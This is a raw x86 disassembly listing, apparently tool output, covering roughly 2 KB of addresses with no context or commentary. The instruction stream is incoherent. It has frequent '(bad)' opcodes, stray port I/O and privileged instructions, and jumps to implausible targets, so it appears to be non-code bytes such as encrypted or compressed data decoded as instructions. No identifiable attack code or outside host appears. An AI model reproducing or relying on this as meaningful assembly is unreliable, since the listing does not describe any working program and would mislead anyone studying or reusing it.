  41111d:	neg    DWORD PTR fs:[edi-0x6eda8e06]
  411124:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  411126:	shl    DWORD PTR [eax],cl
  411128:	test   BYTE PTR [edi-0x12],ah
  41112b:	sar    BYTE PTR [esi-0x7b014aad],1
  411131:	cmp    al,0x45
  411133:	cli    
  411134:	dec    esp
  411135:	cmc    
  411136:	inc    ebx
  411137:	shl    BYTE PTR [ebx+0x22],1
  41113a:	clc    
  41113b:	jle    0x41115e
  41113d:	add    ch,dh
  41113f:	test   DWORD PTR [edi+0x5222b88a],edx
  411145:	scas   al,BYTE PTR es:[edi]
  411146:	cmp    BYTE PTR [ebx+0x5bc1f671],bh
  41114c:	clc    
  41114d:	int    0xe6
  41114f:	cmp    ecx,eax
  411151:	dec    ebp
  411152:	sbb    al,0xfa
  411154:	mov    ecx,0x29fb2f3b
  411159:	fistp  QWORD PTR [esi+0x49ee6102]
  41115f:	repz push cs
  411161:	mov    dl,0x2e
  411163:	shr    DWORD PTR [edi-0x64],1
  411166:	scas   al,BYTE PTR es:[edi]
  411167:	in     al,dx
  411168:	dec    eax
  411169:	jb     0x4111e4
  41116b:	sbb    BYTE PTR [eax+0x437fdc07],al
  411171:	jmp    0xe6b1:0xa7a4128a
  411178:	push   0xaa6c35c3
  41117d:	aaa    
  41117e:	stos   BYTE PTR es:[edi],al
  41117f:	dec    eax
  411180:	push   esi
  411181:	(bad)  
  411183:	push   es
  411184:	pop    ecx
  411185:	mov    WORD PTR [ebx+ebx*1],?
  411188:	xchg   ebx,eax
  411189:	mov    ch,0xae
  41118b:	je     0x4111c0
  41118d:	xchg   ebx,eax
  41118e:	loopne 0x4111a0
  411190:	pop    ebx
  411191:	addr16 pop ss
  411193:	(bad)  
  411194:	rol    cl,cl
  411196:	cmp    eax,0x2986ef97
  41119b:	aam    0xf5
  41119d:	mov    ds:0x2b86d721,eax
  4111a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111a3:	push   es
  4111a4:	jmp    0xb6cbc526
  4111a9:	mov    ebp,gs
  4111ab:	loope  0x411154
  4111ad:	pop    esi
  4111ae:	mov    ecx,0xf135814f
  4111b3:	push   esp
  4111b4:	dec    eax
  4111b5:	cmp    eax,0xb2100a87
  4111ba:	jo     0x411158
  4111bc:	imul   esp,DWORD PTR [edx],0x92062ab4
  4111c2:	test   DWORD PTR [edx],0x82e10160
  4111c8:	daa    
  4111c9:	and    DWORD PTR [esi],edx
  4111cb:	mov    ch,0x52
  4111cd:	and    DWORD PTR [esi],esp
  4111cf:	dec    ebx
  4111d0:	push   edx
  4111d1:	jne    0x411203
  4111d3:	stos   DWORD PTR es:[edi],eax
  4111d4:	imul   ebp,DWORD PTR [edi],0x1969f20a
  4111da:	(bad)  
  4111db:	mov    ds:0x39f86266,al
  4111e0:	iret   
  4111e1:	or     al,0x9f
  4111e3:	psllw  mm7,QWORD PTR [edi-0x45561d6e]
  4111ea:	cmp    ebp,DWORD PTR [edi+ecx*4+0x35]
  4111ee:	dec    ecx
  4111ef:	div    BYTE PTR [ebx+0x33a077c3]
  4111f5:	(bad)  
  4111f6:	sbb    edi,DWORD PTR [ecx-0x7a]
  4111f9:	xchg   ebp,eax
  4111fa:	or     DWORD PTR [ebx+ebx*2-0x4b8a5c31],ecx
  411201:	pop    eax
  411202:	dec    ecx
  411203:	fsub   DWORD PTR [esi]
  411205:	cmp    al,0xad
  411207:	cmp    dl,BYTE PTR [ebp+esi*2-0x23d6b897]
  41120e:	out    0x0,eax
  411210:	fld    QWORD PTR [edi]
  411212:	push   edi
  411213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411214:	stc    
  411215:	dec    esi
  411216:	out    0x7a,eax
  411218:	sbb    al,0x2
  41121a:	add    DWORD PTR [eax-0x585b8679],0xe15c30b8
  411224:	mov    fs,WORD PTR [eax]
  411226:	popa   
  411227:	out    0x2a,al
  411229:	retf   0x22a9
  41122c:	test   DWORD PTR ds:[edx],edx
  41122f:	cmc    
  411230:	xchg   ecx,eax
  411231:	cmc    
  411232:	fisubr WORD PTR [ebp+0x5]
  411235:	scas   eax,DWORD PTR es:[edi]
  411236:	je     0x4111c3
  411238:	inc    ebp
  411239:	mov    edx,0xda115116
  41123e:	cmp    bl,BYTE PTR [ebx+0x1b]
  411241:	cmp    al,0xa4
  411243:	push   ecx
  411244:	sub    BYTE PTR [ebp-0x5f],bl
  411247:	push   esi
  411248:	or     DWORD PTR [edx+esi*2+0x29b7788d],esp
  41124f:	fisttp DWORD PTR [eax-0x4a]
  411252:	icebp  
  411253:	jae    0x4111f0
  411255:	mov    bl,0x98
  411257:	mov    BYTE PTR [ebx+ecx*2],bl
  41125a:	iret   
  41125b:	mov    cl,BYTE PTR [ebx-0x4c80e47b]
  411261:	mov    esi,0xee75f24d
  411266:	arpl   bp,si
  411268:	rol    BYTE PTR [esi-0x22],1
  41126b:	stos   BYTE PTR es:[edi],al
  41126c:	std    
  41126d:	jnp    0x411244
  41126f:	rcl    BYTE PTR [edx-0x73729649],1
  411275:	cmp    BYTE PTR [edx-0x61],cl
  411278:	mov    WORD PTR [ecx+0x24],cs
  41127b:	(bad)  [edx+edi*8-0x64]
  41127f:	enter  0x90b4,0x5e
  411283:	push   ebp
  411284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411285:	imul   ebx,edi,0x557842c5
  41128b:	inc    eax
  41128c:	inc    eax
  41128d:	add    esp,DWORD PTR [ecx-0x21]
  411290:	jecxz  0x41123a
  411292:	pop    ebx
  411293:	and    DWORD PTR ds:0x8420ad88,edi
  411299:	in     eax,dx
  41129a:	mov    al,ds:0xd4491d35
  41129f:	les    eax,FWORD PTR [ebx]
  4112a1:	sahf   
  4112a2:	cmc    
  4112a3:	pusha  
  4112a4:	inc    esi
  4112a5:	les    eax,FWORD PTR [esi]
  4112a7:	adc    BYTE PTR [ebx-0x65],cl
  4112aa:	aas    
  4112ab:	inc    esp
  4112ac:	cvtdq2ps xmm7,XMMWORD PTR [edi-0x17]
  4112b0:	fadd   DWORD PTR [ecx-0x400bbbb8]
  4112b6:	pop    ecx
  4112b7:	dec    ecx
  4112b8:	lods   eax,DWORD PTR ds:[esi]
  4112b9:	loope  0x41126a
  4112bb:	in     eax,dx
  4112bc:	inc    edx
  4112bd:	adc    eax,0x98c7b4dd
  4112c2:	dec    esp
  4112c3:	mov    bl,0x2e
  4112c5:	inc    eax
  4112c6:	outs   dx,BYTE PTR ds:[esi]
  4112c7:	pop    si
  4112c9:	popf   
  4112ca:	clc    
  4112cb:	push   ebx
  4112cc:	jmp    0x359a23dd
  4112d1:	mov    eax,ds:0xfbb99e3e
  4112d6:	jg     0x41131c
  4112d8:	loop   0x411356
  4112da:	(bad)  
  4112dc:	stc    
  4112dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112de:	ja     0x411272
  4112e0:	cmp    DWORD PTR [ebp+0x77],edi
  4112e3:	in     al,0xab
  4112e5:	jg     0x411297
  4112e7:	xchg   ebx,eax
  4112e8:	pop    ebx
  4112e9:	(bad)  
  4112ea:	aas    
  4112eb:	xchg   ebx,eax
  4112ec:	outs   dx,DWORD PTR ds:[esi]
  4112ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112ee:	out    dx,al
  4112ef:	add    al,0x40
  4112f1:	sub    al,0x3e
  4112f3:	add    edi,eax
  4112f5:	sbb    al,0x81
  4112f7:	dec    ebx
  4112f8:	pop    eax
  4112f9:	cmp    bl,BYTE PTR [esi+ecx*8-0x7d]
  4112fd:	fst    QWORD PTR ds:0x74d0b07b
  411303:	mov    gs,ebp
  411305:	adc    edi,DWORD PTR [ebp+0xa]
  411308:	push   esi
  411309:	mov    bl,BYTE PTR [ecx-0x158935f3]
  41130f:	fcom   DWORD PTR [esi+edi*2]
  411312:	fwait
  411313:	inc    ebx
  411314:	jle    0x4112ef
  411316:	push   edx
  411317:	imul   ecx,ebp,0xb9ac37a0
  41131d:	mov    eax,ds:0x10834f4e
  411322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411323:	int    0x88
  411325:	cmp    dl,BYTE PTR [eax-0x17bd0651]
  41132b:	loope  0x411329
  41132d:	jbe    0x4112d4
  41132f:	lods   al,BYTE PTR ds:[esi]
  411330:	sbb    BYTE PTR [ebx+0x0],cl
  411333:	cmp    eax,0x4f670f2c
  411338:	fdiv   QWORD PTR [bp+si+0x3508]
  41133d:	inc    esp
  41133e:	mov    ds:0xbef53031,eax
  411343:	sub    eax,0xf4745d61
  411348:	push   es
  411349:	jl     0x41139c
  41134b:	jmp    0x9b0ab880
  411350:	push   es
  411351:	jnp    0x4113c9
  411353:	stos   DWORD PTR es:[edi],eax
  411354:	in     eax,0xd4
  411356:	add    BYTE PTR [edx-0x48],ch
  411359:	das    
  41135a:	out    0x4a,eax
  41135c:	test   ch,0x80
  41135f:	xchg   ebp,eax
  411360:	push   cs
  411361:	or     eax,DWORD PTR [edi-0x51f2cf1]
  411367:	or     eax,0xb3fef515
  41136c:	ror    DWORD PTR [edx],0x3b
  41136f:	mov    dh,0xb1
  411371:	dec    ebx
  411372:	jae    0x4113b7
  411374:	in     al,dx
  411375:	dec    esi
  411376:	dec    ebx
  411377:	dec    eax
  411378:	scas   al,BYTE PTR es:[edi]
  411379:	(bad)  
  41137a:	in     al,0xa7
  41137c:	push   esi
  41137d:	mov    eax,0x5f255f2c
  411382:	dec    ebp
  411383:	ficomp DWORD PTR [ebx]
  411385:	sub    BYTE PTR [ecx+eiz*1],0x3b
  411389:	pusha  
  41138a:	mov    ds:0x9bd26f00,eax
  41138f:	in     al,0x6e
  411391:	push   ebp
  411392:	xchg   edx,eax
  411393:	loopne 0x41140c
  411395:	jle    0x411397
  411397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411398:	sub    DWORD PTR [ebp-0x2],eax
  41139b:	icebp  
  41139c:	mov    cl,0x76
  41139e:	inc    ebp
  41139f:	fistp  WORD PTR [eax]
  4113a1:	jecxz  0x41132d
  4113a3:	xchg   edx,eax
  4113a4:	retw   
  4113a6:	in     al,dx
  4113a7:	(bad)  
  4113a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113a9:	pop    esp
  4113aa:	jmp    0xe98e:0x14fafba8
  4113b1:	outs   dx,BYTE PTR ds:[esi]
  4113b2:	sbb    BYTE PTR [edx],0xf4
  4113b5:	and    eax,0xc72d28ab
  4113ba:	adc    eax,0x3e453e61
  4113bf:	push   es
  4113c0:	push   ebp
  4113c1:	scas   eax,DWORD PTR es:[edi]
  4113c2:	popf   
  4113c3:	inc    ebx
  4113c4:	sbb    al,0x77
  4113c6:	jnp    0x41141a
  4113c8:	test   DWORD PTR [ecx],edi
  4113ca:	sub    eax,0xdf06d1f
  4113cf:	out    0x5d,al
  4113d1:	xchg   edx,eax
  4113d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113d3:	mov    bh,0xe8
  4113d5:	sbb    ecx,esp
  4113d7:	std    
  4113d8:	dec    edx
  4113d9:	dec    esp
  4113da:	add    al,0x50
  4113dc:	sub    al,0xb
  4113de:	ret    
  4113df:	mov    edx,DWORD PTR ds:0x438c410b
  4113e5:	or     eax,0x985fe56e
  4113ea:	jmp    0x660c:0x225b33a7
  4113f1:	lock test BYTE PTR [ebx],0x4d
  4113f5:	dec    edx
  4113f6:	pop    esi
  4113f7:	mov    eax,0x198c2063
  4113fc:	pop    ebx
  4113fd:	push   cs
  4113fe:	push   ebp
  4113ff:	out    0xeb,al
  411401:	mov    ch,0x38
  411403:	mov    ch,0x57
  411405:	pop    ecx
  411406:	xor    esp,esi
  411408:	fist   WORD PTR [edx-0x46294004]
  41140e:	test   eax,0xf1c027c
  411413:	add    al,0x33
  411415:	sub    al,0xb9
  411417:	adc    eax,0xf28239ef
  41141c:	jl     0x41141d
  41141e:	es dec ebp
  411420:	and    BYTE PTR [ebx-0x36e35f66],ah
  411426:	mov    dl,0x98
  411428:	stos   BYTE PTR es:[edi],al
  411429:	bound  edx,QWORD PTR [ecx+0x317a8c33]
  41142f:	fsubr  DWORD PTR [edi+ebx*1+0x7d95bc16]
  411436:	fisubr DWORD PTR [edi+0x3a]
  411439:	and    esp,DWORD PTR [edx-0x49ed6ebf]
  41143f:	jg     0x41147f
  411441:	leave  
  411442:	and    eax,DWORD PTR [ebp+0x76e7cdf3]
  411448:	jne    0x411462
  41144a:	pop    edx
  41144b:	pop    ebp
  41144c:	xchg   ebx,eax
  41144d:	mov    dh,0x33
  41144f:	pop    ebx
  411450:	push   ds
  411451:	nop
  411452:	clc    
  411453:	hlt    
  411454:	shl    BYTE PTR [edx+0x33e421a1],1
  41145a:	inc    ebx
  41145b:	mov    dl,0xa2
  41145d:	mov    esi,0xd06caeeb
  411462:	xchg   esi,eax
  411463:	fadd   DWORD PTR [eax]
  411465:	stc    
  411466:	shr    bl,cl
  411468:	xchg   BYTE PTR [ebx+ebx*4-0x1e535ba1],ah
  41146f:	sahf   
  411470:	sbb    al,0x6a
  411472:	int3   
  411473:	and    al,0x90
  411475:	jge    0x411454
  411477:	xchg   ecx,eax
  411478:	es sub al,0x34
  41147b:	xchg   edx,eax
  41147c:	inc    esi
  41147d:	xor    edx,esp
  41147f:	add    BYTE PTR [ebp+0x70],dh
  411482:	cdq    
  411483:	js     0x4114a1
  411485:	mov    ds:0xc4d32ba4,eax
  41148a:	xor    eax,0xa799e71b
  41148f:	rol    BYTE PTR [ecx+0x40],1
  411492:	and    bh,BYTE PTR [edx-0x2f122db1]
  411498:	mov    BYTE PTR [edx-0x59],ch
  41149b:	sbb    bl,BYTE PTR [ebp+0x3e]
  41149e:	mov    bh,0xef
  4114a0:	adc    esi,ebp
  4114a2:	xor    ebp,ebp
  4114a4:	test   eax,0x2268b1f3
  4114a9:	aas    
  4114aa:	pop    ebx
  4114ab:	fldcw  WORD PTR [eax-0x8]
  4114ae:	int3   
  4114af:	das    
  4114b0:	push   es
  4114b1:	and    eax,0x32bf69ca
  4114b6:	adc    eax,0x8d6150a7
  4114bb:	jnp    0x4114d1
  4114bd:	dec    DWORD PTR [ebp+0x5169cb19]
  4114c3:	or     eax,DWORD PTR [edi+0x55]
  4114c6:	pusha  
  4114c7:	fsub   st,st(6)
  4114c9:	loope  0x41148c
  4114cb:	cwde   
  4114cc:	cwde   
  4114cd:	pop    eax
  4114ce:	cld    
  4114cf:	fwait
  4114d0:	rcl    BYTE PTR [eax+0x1b],1
  4114d3:	cmp    al,0xf7
  4114d5:	popa   
  4114d6:	leave  
  4114d7:	sbb    dl,BYTE PTR [edx-0x2]
  4114da:	xchg   esp,eax
  4114db:	cmp    esp,DWORD PTR [ecx]
  4114dd:	mov    cs,WORD PTR [edi-0x68]
  4114e0:	mov    dh,0xcf
  4114e2:	aad    0x7d
  4114e4:	in     eax,dx
  4114e5:	and    DWORD PTR [eax],ebx
  4114e7:	sbb    ebx,DWORD PTR [ebp+0x68f2e752]
  4114ed:	sar    DWORD PTR [ebx-0x4c4e83d7],cl
  4114f3:	les    edx,FWORD PTR [esi]
  4114f5:	inc    esi
  4114f6:	sbb    BYTE PTR [eax-0x34e4e7a1],0xe4
  4114fd:	clc    
  4114fe:	or     BYTE PTR [eax],bl
  411500:	sbb    BYTE PTR [eax+0x7d],cl
  411503:	inc    ebx
  411504:	scas   al,BYTE PTR es:[edi]
  411505:	and    DWORD PTR [ecx],edi
  411507:	es push edi
  411509:	jbe    0x4114dd
  41150b:	aas    
  41150c:	xchg   ebx,eax
  41150d:	cmp    DWORD PTR [ebp+0x55bc2a35],ebx
  411513:	ds pop edi
  411515:	xchg   ebp,eax
  411516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411517:	jle    0x411539
  411519:	xor    ch,ah
  41151b:	push   edx
  41151c:	fdivp  st(7),st
  41151e:	(bad)  
  41151f:	ds add al,0x65
  411522:	les    ebp,FWORD PTR [esi]
  411524:	lds    ebx,FWORD PTR [edx-0x71183159]
  41152a:	push   ebx
  41152b:	rcl    BYTE PTR [ecx],0x2
  41152e:	pop    eax
  41152f:	xor    BYTE PTR [edx],ch
  411531:	icebp  
  411532:	ins    DWORD PTR es:[edi],dx
  411533:	ror    bh,1
  411535:	push   edi
  411536:	or     bh,cl
  411538:	mov    eax,0x604de84c
  41153d:	in     al,0x48
  41153f:	test   al,0xa5
  411541:	scas   al,BYTE PTR es:[edi]
  411542:	lds    esi,FWORD PTR [ebx+0x2ff1d9ff]
  411548:	add    al,0xd6
  41154a:	mov    ebx,0x1ec0e9bd
  41154f:	push   ebp
  411550:	mov    esi,0x65ecc9b3
  411555:	ins    DWORD PTR es:[edi],dx
  411556:	lahf   
  411557:	adc    al,0x33
  411559:	clc    
  41155a:	jae    0x41151a
  41155c:	cmp    BYTE PTR [ecx+0x38883138],ah
  411562:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  411564:	shl    eax,cl
  411566:	xor    eax,0x24d9dda2
  41156b:	mov    ?,WORD PTR [edx]
  41156d:	shr    BYTE PTR [edi],cl
  41156f:	and    al,0x45
  411571:	hlt    
  411572:	(bad)  
  411573:	push   ebx
  411574:	ins    BYTE PTR es:[edi],dx
  411575:	ret    
  411576:	aad    0xca
  411578:	inc    eax
  411579:	mov    ds:0xa3591c23,al
  41157e:	adc    cl,BYTE PTR [esi+edi*4+0x538eb305]
  411585:	mov    al,0x24
  411587:	xchg   DWORD PTR [ebx],ebx
  411589:	sbb    BYTE PTR [ebx+0x15b52109],cl
  41158f:	fs mov ah,0xc8
  411592:	test   eax,0xbe5b87ec
  411597:	sub    ah,BYTE PTR [esi-0x16]
  41159a:	or     al,0xf1
  41159c:	bound  eax,QWORD PTR [edx-0xb]
  41159f:	mov    eax,ecx
  4115a1:	out    0xf,eax
  4115a3:	(bad)  
  4115a4:	dec    edx
  4115a5:	push   es
  4115a6:	push   esp
  4115a7:	fwait
  4115a8:	out    0x79,al
  4115aa:	push   ss
  4115ab:	(bad)  [ebx]
  4115ad:	pop    edi
  4115ae:	add    al,0x8a
  4115b0:	add    eax,0xb8ef0216
  4115b5:	aaa    
  4115b6:	xchg   ebx,eax
  4115b7:	retf   
  4115b8:	nop
  4115b9:	adc    al,0xd1
  4115bb:	lock dec eax
  4115bd:	xchg   ebx,eax
  4115be:	aaa    
  4115bf:	mov    ch,al
  4115c1:	push   edx
  4115c2:	(bad)  
  4115c4:	sub    eax,ecx
  4115c6:	jo     0x411571
  4115c8:	add    al,0x5a
  4115ca:	imul   ch
  4115cc:	ja     0x411576
  4115ce:	push   ax
  4115d0:	jo     0x4115a1
  4115d2:	test   eax,0x7cf00e04
  4115d7:	fs push ebx
  4115d9:	mov    dh,0x9d
  4115db:	imul   esi,ebp,0xffffffd8
  4115de:	inc    ebp
  4115df:	cmp    ebx,esi
  4115e1:	or     eax,0x90b6709e
  4115e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115e7:	aaa    
  4115e8:	(bad)
  4115eb:	inc    eax
  4115ec:	aas    
  4115ed:	jo     0x4115d4
  4115ef:	sbb    eax,0x5bab8459
  4115f4:	cld    
  4115f5:	cs (bad) 
  4115f7:	lea    ebp,[esi]
  4115f9:	sar    eax,0x34
  4115fc:	call   0xa8239b68
  411601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411602:	jbe    0x4115c2
  411604:	push   ss
  411605:	int    0x9
  411607:	sbb    eax,DWORD PTR [ebx+ebp*4-0x1f81b180]
  41160e:	xchg   ebx,eax
  41160f:	jle    0x411669
  411611:	sub    DWORD PTR [ebx+0x4557565c],eax
  411617:	out    dx,eax
  411618:	push   0x2eee38b5
  41161d:	shr    BYTE PTR [edx-0x7aa883a0],1
  411623:	shr    BYTE PTR [eax-0x63],1
  411626:	mov    dh,0xa8
  411628:	sbb    dh,BYTE PTR [ebx-0xc8f73fb]
  41162e:	push   ebx
  41162f:	cmp    eax,0x5d1ae9e7
  411634:	jne    0x4116b3
  411636:	xor    edx,DWORD PTR [edx]
  411638:	clc    
  411639:	xchg   esp,eax
  41163a:	bound  esi,QWORD PTR [ebx-0x55]
  41163d:	aad    0xe3
  41163f:	jns    0x411669
  411641:	fs xor eax,0xb8b915d8
  411647:	mov    eax,0x8cadc1b8
  41164c:	leave  
  41164d:	ins    DWORD PTR es:[edi],dx
  41164e:	es xor ah,dl
  411651:	lahf   
  411652:	fild   WORD PTR [ecx-0x26]
  411655:	pop    ebp
  411656:	mov    WORD PTR [edx-0x4a],cs
  411659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41165a:	pop    ss
  41165b:	rol    cl,1
  41165d:	jl     0x411668
  41165f:	pop    ebp
  411660:	sub    al,0x31
  411662:	dec    esp
  411663:	adc    ebp,DWORD PTR [edx+0x556549e1]
  411669:	adc    ebp,esp
  41166b:	mov    esp,0xb03b15db
  411670:	and    al,0xcd
  411672:	mov    ecx,0x7bf9d61f
  411677:	ret    0xe9af
  41167a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41167b:	test   al,0x4c
  41167e:	sbb    eax,0x8da5cbad
  411683:	push   edi
  411684:	mov    WORD PTR [ebx+0x153b69ad],es
  41168a:	pop    edi
  41168b:	mov    esp,0xcbde9b3b
  411690:	outs   dx,BYTE PTR ds:[esi]
  411691:	jge    0x4116eb
  411693:	retf   0x7108
  411696:	fs jg  0x4116a2
  411699:	retf   0x969c
  41169c:	mov    ebx,0xfe798905
  4116a1:	xor    edi,ebx
  4116a3:	jecxz  0x411715
  4116a5:	cli    
  4116a6:	call   0xfde7:0x84a2a396
  4116ad:	sub    ebp,DWORD PTR [edi+0x45ed7a62]
  4116b3:	xor    bh,BYTE PTR [edi]
  4116b5:	leave  
  4116b6:	mov    ds:0x1bfd205,eax
  4116bb:	push   ecx
  4116bc:	test   DWORD PTR [esi+0x3e628830],ebx
  4116c2:	sti    
  4116c3:	xor    edx,ebp
  4116c5:	loopne 0x4116f7
  4116c7:	and    al,BYTE PTR [esi]
  4116c9:	xchg   edx,eax
  4116ca:	loopne 0x4116e6
  4116cc:	xchg   ebx,eax
  4116cd:	xor    edx,ebx
  4116cf:	mov    cl,0x2f
  4116d1:	or     DWORD PTR [eax],ebx
  4116d3:	arpl   WORD PTR [ebx-0x57],di
  4116d6:	pop    esi
  4116d7:	(bad)
  4116dc:	test   BYTE PTR [edi+0x1b],0xd
  4116e0:	inc    eax
  4116e1:	adc    DWORD PTR [eax],eax
  4116e3:	aam    0x48
  4116e5:	xchg   BYTE PTR [ecx],cl
  4116e7:	fadd   DWORD PTR [eax+ecx*2]
  4116ea:	push   es
  4116eb:	adc    eax,0x503ddc7e
  4116f0:	ins    DWORD PTR es:[edi],dx
  4116f1:	cmp    DWORD PTR [ebx+0x2118a0e4],edx
  4116f7:	sub    al,0x35
  4116f9:	push   es
  4116fa:	sbb    al,0x2b
  4116fc:	xor    bl,cl
  4116fe:	mov    dh,0x73
  411700:	xchg   edx,eax
  411701:	pop    ebx
  411702:	push   ebp
  411703:	rol    ah,0xe
  411706:	stc    
  411707:	or     eax,0x1defdfd2
  41170c:	mov    ah,BYTE PTR [eax-0xb]
  41170f:	test   dl,ah
  411711:	in     al,dx
  411712:	jecxz  0x411760
  411714:	ja     0x411727
  411716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411717:	inc    esi
  411718:	iret   
  411719:	pop    ds
  41171a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41171c:	ret    0x3da0
  41171f:	xchg   edi,eax
  411720:	sbb    esp,DWORD PTR [edi-0x5d]
  411723:	or     eax,0x696e720b
  411728:	loopne 0x411739
  41172a:	imul   esp,DWORD PTR [edi],0x36074d80
  411730:	sbb    edx,ebp
  411732:	and    al,0xd0
  411734:	push   0x30
  411736:	push   esp
  411737:	dec    edi
  411738:	test   DWORD PTR [esi+0x5c],edx
  41173b:	mov    cl,0x11
  41173d:	adc    BYTE PTR [edx+0x1001098f],al
  411743:	cmp    al,0x62
  411745:	cmp    BYTE PTR [esi+0x0],cl
  411748:	rol    BYTE PTR [edi+ecx*2+0x7563bb5c],1
  41174f:	sbb    eax,0xffffffdb
  411752:	adc    DWORD PTR [eax+0x1117248e],eax
  411758:	pop    es
  411759:	sub    al,0x99
  41175b:	std    
  41175c:	xchg   ebp,eax
  41175d:	das    
  41175e:	pushf  
  41175f:	cs fxtract 
  411762:	jnp    0x411751
  411764:	scas   eax,DWORD PTR es:[edi]
  411765:	push   ss
  411766:	pop    edi
  411767:	push   ecx
  411768:	push   esp
  411769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41176a:	push   ds
  41176b:	xchg   ebp,eax
  41176c:	dec    eax
  41176d:	add    cl,BYTE PTR [ebp+0x44]
  411770:	(bad)  
  411771:	dec    eax
  411772:	mov    cs,WORD PTR [ebp*8+0x790c767c]
  411779:	push   esp
  41177a:	jae    0x4117e5
  41177c:	sti    
  41177d:	out    dx,al
  41177e:	ja     0x411724
  411780:	cmp    dl,dh
  411782:	ror    eax,0x9
  411785:	or     DWORD PTR [ebx-0x15],0x3a
  411789:	cmp    DWORD PTR [ebx+0x75],eax
  41178c:	mov    cl,0x49
  41178e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41178f:	sub    esp,DWORD PTR [esi-0x4c728b0f]
  411795:	nop
  411796:	add    cl,BYTE PTR [ebx-0xed5c85b]
  41179c:	ins    BYTE PTR es:[edi],dx
  41179d:	adc    esi,edi
  41179f:	xchg   BYTE PTR [edi+0x22],bh
  4117a2:	mov    bl,0xe6
  4117a4:	inc    esi
  4117a5:	jp     0x411816
  4117a7:	and    esi,DWORD PTR [ecx-0x17]
  4117aa:	inc    esp
  4117ab:	bound  ebx,QWORD PTR [esi-0x40]
  4117ae:	(bad)  
  4117af:	aad    0xc7
  4117b1:	mov    dl,0xcb
  4117b3:	mov    ecx,0x244bab02
  4117b8:	inc    esp
  4117b9:	popf   
  4117ba:	mov    esp,0xd11505e
  4117bf:	enter  0x3be6,0xdc
  4117c3:	dec    ebp
  4117c4:	dec    edx
  4117c5:	imul   esp,DWORD PTR [esi+0x49e532a4],0xb1668846
  4117cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117d0:	mov    DWORD PTR [ebx-0x46],ebx
  4117d3:	jmp    DWORD PTR [ecx+esi*8]
  4117d6:	add    al,0xee
  4117d8:	pop    esi
  4117d9:	xchg   esp,eax
  4117da:	mov    ds:0x6dbe7316,al
  4117df:	loope  0x41178b
  4117e1:	daa    
  4117e2:	imul   ebp,DWORD PTR [ebp+0x70866ff3],0x8f37afdc
  4117ec:	lea    ecx,[ebx-0x26]
  4117ef:	or     BYTE PTR [ecx+0x38],0x80
  4117f3:	scas   al,BYTE PTR es:[edi]
  4117f4:	imul   ebx,DWORD PTR ds:0x139fd81f,0xffffff8d
  4117fb:	sbb    eax,0x3c28435c
  411800:	stc    
  411801:	xor    al,al
  411803:	mov    esi,0xec546a59
  411808:	push   DWORD PTR [ebx-0x65]
  41180b:	add    ah,bh
  41180d:	mov    edi,0x6f3ff24b
  411812:	bnd ret 
  411814:	icebp  
  411815:	adc    DWORD PTR [ebx-0x7ea73c17],0xfffffffd
  41181c:	dec    ecx
  41181d:	or     al,0x71
  41181f:	(bad)  
  411820:	and    eax,0x87071f3f
  411825:	arpl   WORD PTR [ebp+0x748ee12],di
  41182b:	jne    0x411855
  41182d:	cmp    BYTE PTR fs:[eax],ah
  411830:	push   0x64
  411832:	out    0xa1,al
  411834:	push   ss
  411835:	add    BYTE PTR [ebx+esi*4],al
  411838:	push   ebx
  411839:	adc    eax,0x3e3e9b02
  41183e:	outs   dx,DWORD PTR ds:[esi]
  41183f:	imul   ebx,DWORD PTR [edi+0x2532ec95],0x1b8b1ce
  411849:	into   
  41184a:	in     eax,0x5c
  41184c:	leave  
  41184d:	mov    ebp,0x7391d3cf
  411852:	popf   
  411853:	xor    eax,0x9ec37a61
  411858:	in     al,0x77
  41185a:	lds    edi,FWORD PTR [edi]
  41185c:	mov    ds:0xf213bc73,al
  411861:	outs   dx,BYTE PTR ds:[esi]
  411862:	sar    BYTE PTR [esi+0x4f],0xa7
  411866:	jae    0x4118e4
  411868:	ds lahf 
  41186a:	daa    
  41186b:	jno    0x4118cb
  41186d:	dec    BYTE PTR [edx+edi*1+0x63]
  411871:	and    BYTE PTR [esi+ebp*8],dh
  411874:	ins    BYTE PTR es:[edi],dx
  411875:	add    al,0x87
  411877:	outs   dx,BYTE PTR ds:[esi]
  411878:	or     al,0x68
  41187a:	mov    cs:0xb90a453f,al
  411880:	push   edi
  411881:	push   cs
  411882:	fsubr  DWORD PTR [edx+0x3]
  411885:	outs   dx,BYTE PTR ds:[esi]
  411886:	cdq    
  411887:	jne    0x4118db
  411889:	shr    ebx,1
  41188b:	retf   0x838a
  41188e:	pop    edi
  41188f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411890:	jbe    0x4118ae
  411892:	rcr    DWORD PTR [edx+0x37436fe5],1
  411898:	push   eax
  411899:	(bad)  
  41189a:	popf   
  41189b:	fidivr WORD PTR [ecx]
  41189d:	leave  
  41189e:	lahf   
  41189f:	mov    ebx,0x6ea191b0
  4118a4:	int3   
  4118a5:	pop    edx
  4118a6:	mov    bh,0xcd
  4118a8:	push   es
  4118a9:	inc    esi
  4118aa:	lods   al,BYTE PTR ds:[esi]
  4118ab:	icebp  
  4118ac:	(bad)  
  4118ad:	push   esp
  4118ae:	sbb    dh,BYTE PTR ds:0x77c35d1f
  4118b4:	jl     0x411886
  4118b6:	ficom  WORD PTR [edi+0x64]
